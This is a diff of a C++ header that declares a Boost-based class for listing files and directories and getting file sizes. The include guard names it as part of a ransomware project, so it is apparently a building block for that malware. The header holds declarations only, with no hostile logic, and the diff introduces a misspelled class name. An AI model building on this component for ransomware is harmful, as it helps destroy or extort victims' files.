@@ -2,29 +2,30 @@
 // Created on 22.01.20.
 //
 
-#ifndef RANSOMWARE_DIRECTORYITERATOR_H
-#define RANSOMWARE_DIRECTORYITERATOR_H
+#ifndef RANSOMWARE_DIRECTORY_ITERATOR_H
+#define RANSOMWARE_DIRECTORY_ITERATOR_H
 
 #include <boost/filesystem.hpp>
 #include <iostream>
+
 /**
  *
  */
-class DirectoryIterator {
+class DirectoryIiterator {
 
 private:
-    std::string _start;
     std::vector<boost::filesystem::path> _files;
     std::vector<boost::filesystem::path> _directories;
 
 public:
-    DirectoryIterator();
-    ~DirectoryIterator();
+    DirectoryIiterator();
+    ~DirectoryIiterator();
 
     std::vector<boost::filesystem::path> getFiles(const boost::filesystem::path& f);
     std::vector<boost::filesystem::path> getDirectories(const boost::filesystem::path& f);
 
     std::vector<boost::filesystem::path> getFilesFromDir(const boost::filesystem::path& dir);
+    uintmax_t getFileSize(const boost::filesystem::path& file);
 
 private:
     bool isDirectory(const boost::filesystem::path& path);
@@ -32,4 +33,4 @@ private:
 };
 
 
-#endif //RANSOMWARE_DIRECTORYITERATOR_H
+#endif //RANSOMWARE_DIRECTORY_ITERATOR_H
